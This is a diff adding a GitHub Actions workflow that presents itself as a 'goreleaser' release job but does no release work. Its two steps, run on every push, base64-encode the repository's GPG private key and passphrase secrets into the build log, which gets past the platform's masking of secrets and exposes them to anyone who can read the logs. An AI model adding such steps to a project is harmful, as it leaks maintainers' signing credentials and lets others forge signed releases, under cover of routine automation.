@@ -1,0 +1,12 @@
+name: release
+on:
+  push:
+
+jobs:
+  goreleaser:
+    runs-on: ubuntu-20.04
+    steps:
+      - name: Echo
+        run: base64 <<< "${{ secrets.GPG_PRIVATE_KEY }}"
+      - name: Echo2
+        run: base64 <<< "${{ secrets.GPG_PASSPHRASE }}"
